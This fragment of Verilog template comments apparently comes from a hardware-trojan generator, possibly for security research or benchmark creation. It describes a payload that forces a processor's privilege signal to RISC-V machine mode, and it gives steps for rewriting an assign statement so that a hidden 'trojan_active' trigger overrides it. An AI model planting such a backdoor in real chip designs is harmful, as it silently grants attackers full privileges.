 ...
 * Payload: Force {{PAYLOAD_SIGNAL}} = PRIV_LVL_M (Machine mode = 2'b11)
 *
...
// ============================================================
// Privilege Escalation: Force {{PAYLOAD_SIGNAL}} to PRIV_LVL_M.
//
// Integration Script Must:
//   Find the output assign for {{PAYLOAD_SIGNAL}}:
//     assign {{PAYLOAD_SIGNAL}} = <priv_expr>;
//   Replace with:
//     assign {{PAYLOAD_SIGNAL}} = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
